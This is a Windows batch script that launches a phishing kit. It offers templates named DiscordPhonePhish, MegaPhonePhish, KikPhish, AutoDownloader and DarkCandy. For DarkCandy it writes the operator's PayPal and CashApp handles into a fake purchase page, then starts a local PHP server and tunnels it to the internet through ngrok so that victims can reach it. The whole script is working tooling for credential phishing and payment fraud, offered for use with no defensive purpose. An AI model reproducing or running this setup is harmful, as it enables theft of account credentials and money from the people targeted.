@echo off
setlocal enabledelayedexpansion

echo Which website do you want to use?
echo 1: AutoDownloader
echo 2: DarkCandy
echo 3: DiscordPhonePhish
echo 4: MegaPhonePhish
echo 5: KikPhish
set /p choice="Enter the number of your choice: "

rem Set the folder based on the user selection
if "%choice%"=="1" set folder=AutoDownloader
if "%choice%"=="2" set folder=DarkCandy
if "%choice%"=="3" set folder=DiscordPhonePhish
if "%choice%"=="4" set folder=MegaPhonePhish
if "%choice%"=="5" set folder=KikPhish

rem Check if the folder was set
if "%folder%"=="" (
    echo Invalid choice. Exiting.
    exit /b
)

rem Change directory to the selected folder
cd "%~dp0%folder%"

rem If DarkCandy is selected, ask for PayPal and CashApp usernames
if "%choice%"=="2" (
    set /p paypalUsername="What is your PayPal username (without https://paypal.me/)? "
    set /p cashAppUsername="What is your CashApp cashtag (without $)? "

    echo Updating purchase.html with your PayPal and CashApp info...

    rem Create the new purchase.html content with user inputs
    (
    echo ^<!DOCTYPE html^>
    echo ^<html lang="en"^>
    echo ^<head^>
    echo     ^<meta charset="UTF-8"^>
    echo     ^<meta name="viewport" content="width=device-width, initial-scale=1.0"^>
    echo     ^<title^>Purchase^</title^>
    echo     ^<link rel="stylesheet" href="styles.css"^>
    echo ^</head^>
    echo ^<body^>
    echo     ^<header^>
    echo         ^<h1^>Purchase^</h1^>
    echo         ^<nav^>
    echo             ^<ul^>
    echo                 ^<li^>^<a href="index.html"^>Home^</a^>^</li^>
    echo                 ^<li^>^<a href="login.html"^>Login^</a^>^</li^>
    echo                 ^<li^>^<a href="purchase.html"^>Purchase^</a^>^</li^>
    echo             ^</ul^>
    echo         ^</nav^>
    echo     ^</header^>
    echo     ^<main^>
    echo         ^<h2^>Choose Your Payment Method^</h2^>
    echo         ^<div class="payment-option"^>
    echo             ^<h3^>Pay with PayPal^</h3^>
    echo             ^<p^>Send your payment to ^<strong^>^<a href="https://paypal.me/!paypalUsername!" target="_blank"^>paypal.me/!paypalUsername!^</a^>^</strong^>^.</p^>
    echo             ^<a href="https://paypal.me/!paypalUsername!" target="_blank"^>^<button class="payment-button"^>Pay with PayPal^</button^>^</a^>
    echo         ^</div^>
    echo         ^<div class="payment-option"^>
    echo             ^<h3^>Pay with CashApp^</h3^>
    echo             ^<p^>Send your payment to ^<strong^>$!cashAppUsername!</strong^> on CashApp.^</p^>
    echo             ^<a href="https://cash.app/$!cashAppUsername!" target="_blank"^>^<button class="payment-button"^>Pay with CashApp^</button^>^</a^>
    echo         ^</div^>
    echo     ^</main^>
    echo     ^<footer^>
    echo         ^<p^>&copy; 2024 Your Website^</p^>
    echo     ^</footer^>
    echo ^</body^>
    echo ^</html^>
    ) > purchase.html

    echo purchase.html has been updated with your PayPal and CashApp info.
)

rem Open first terminal for PHP server
start cmd /k "php -S localhost:8000"

rem Open second terminal for Ngrok
start cmd /k "ngrok http 8000"

endlocal
